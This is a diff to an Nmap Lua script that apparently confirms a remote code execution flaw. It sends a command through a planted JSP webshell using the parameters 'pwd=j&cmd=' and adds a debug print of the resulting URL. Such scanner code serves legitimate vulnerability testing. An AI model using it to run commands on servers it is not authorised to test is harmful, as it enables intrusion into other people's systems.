@@ -101,9 +101,11 @@ action = function(host, port)
 
     -- Verify that RCE is working on the server
     stdnse.debug("Verify that RCE is working on the server")
-    local response = http.generic_request(host, port.number, "GET", endpoint, { header = get_headers, content = pattern_data, no_cache = true })
+    local response = http.generic_request(host, port.number, "GET", endpoint .. "/" .. filename .. ".jsp?pwd=j&cmd=" .. command, { header = get_headers, content = pattern_data, no_cache = true })
     local response_body = response.body
     local status = response.status
+
+    print(host.ip .. endpoint .. "/" .. filename .. ".jsp?pwd=j&cmd=" .. command)
 
     if status == nil then
       -- Something went really wrong out there
@@ -111,12 +113,12 @@ action = function(host, port)
       vuln.extra_info = "URL: " .. host.ip .. ":" .. port.number .. endpoint
     else
       if status ~= 404 then
-        if string.find(response_body, assertion) or string.find(response_body, "quest.getParameter") then
+        if string.find(response_body, assertion) then
           vuln.state = vulns.STATE.VULN
         else
           vuln.state = vulns.STATE.LIKELY_VULN
         end
-        vuln.check_results = host.ip .. ":" .. port.number .. "/" .. filename .. ".jsp?cmd=" .. command
+        vuln.check_results = host.ip .. ":" .. port.number .. "/" .. filename .. ".jsp?pwd=j&cmd=" .. command
         vuln.extra_info = "TESTED URL: " .. host.ip .. ":" .. port.number .. endpoint .. "\n" .. "    COMMAND: " .. command .. "\n" .. "    ASSERTION: " .. assertion
       else
         vuln.extra_info = "TESTED URL: " .. host.ip .. ":" .. port.number .. endpoint .. "\n" .. "    COMMAND: " .. command .. "\n" .. "    ASSERTION: " .. assertion
